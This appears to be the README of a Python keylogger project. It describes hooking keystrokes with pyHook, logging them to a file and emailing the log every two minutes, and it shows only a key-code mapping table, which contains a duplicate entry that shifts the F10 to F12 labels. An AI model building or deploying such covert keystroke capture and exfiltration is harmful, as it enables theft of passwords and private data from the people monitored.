# Python Keylogger

> - Using Pyhook to implement a keylogger that tracks keystrokes and records them in a text file.
> - Sends an email containing the contents of the above text file every X minutes (currently 2 minutes)

## TODO

- [x] Send via email
- [x] Map the keys to values
- [x] Threading Function for email

## Key mapping

```python
mapping = { 8: "<BackSpace>",
            9: "<tab>",
            13: "<enter>\n",
            19: "<pause>",
            20: "<capslock>",
            27: "<esc>", 
            32: " ",
            36: "<home>",
            37: "<arrowleft>", 38: "<arrowup>", 39: "<arrowright>", 40: "<arrowdown>",
            44: "<printscreen>",
            46: "<del>", 
            91: "<win>",
            97: "1", 98: "2", 99: "3", 100: "4", 101: "5", 102: "6", 103: "7", 104: "8", 105: "9",
            106: "*", 107: "+", 109: "-", 110: ".", 111: "/",
            112: "<f1>", 113: "<f2>", 114: "<f3>", 115: "<f4>", 116: "<f5>", 117: "<f6>", 118: "<f7>",
            119: "<f8>", 120: "<f9>", 121: "<f10>", 121: "<f11>", 122: "<f12>",
            144: "<numlock>",
            160: "<lshft>", 161: "<rshft>",
            162: "<lctr>", 163: "<rctr>",
            164: "<lalt>", 165: "<ralt>", 
            186: ";", 187: "=", 188: ",", 189: "-", 190: ".", 191: "/", 192: "`",
            219: "[", 220: "\\", 221: "]", 222: "'",
            }
```
